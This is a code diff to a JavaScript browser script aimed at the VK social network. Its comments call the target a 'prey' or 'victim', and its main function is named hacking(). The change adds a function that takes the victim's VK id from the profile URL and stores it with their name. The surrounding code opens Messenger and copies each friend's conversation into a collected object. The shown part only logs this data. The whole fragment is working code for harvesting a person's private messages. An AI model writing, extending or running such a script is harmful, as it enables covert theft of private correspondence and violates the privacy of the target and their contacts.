@@ -37,6 +37,13 @@ function getPreyFullName() {
 }
 // =============== ИМЯ И ФАМИЛИЯ ЖЕРТВЫ =============== //
 
+// =================== id ЖЕРТВЫ ====================== //
+function getPreyId() {
+    // get path name (/vk_id) and remove slash
+    return window.location.pathname.slice(1);
+}
+// =================== id ЖЕРТВЫ ====================== //
+
 
 /**
  * Получает ссылку "Мессенджер" и нажимает на неё, чтобы перейти в сообщения
@@ -337,6 +344,11 @@ async function hacking() {
     let preyName = await getPreyFullName(); // get full name
     // ===== GET PREY's FULLNAME ===== //
 
+    // ===== GET PREY's VK id ===== //
+    // on profile page get vk id from url
+    let preyId = getPreyId(); // get full name
+    // ===== GET PREY's VK id ===== //
+
 
     // ===== GO TO MESSAGES Page ===== //
     toMessages();
@@ -346,7 +358,11 @@ async function hacking() {
 
     // инициализируем объект с полученными данными
     let dialogsData = {
-        [preyName]: {}
+        // key is vk id of prey
+        // and save prey's name
+        [preyId]: {
+            name: preyName
+        }
     }
     // инициализируем объект с полученными данными
 
@@ -367,7 +383,7 @@ async function hacking() {
         let friendName = getFriendName();
 
         // добавляем сообщения с этой страницы в объект по имени
-        dialogsData[preyName][friendName] = getMessages();
+        dialogsData[preyId][friendName] = getMessages();
 
         console.log(dialogsData);
 
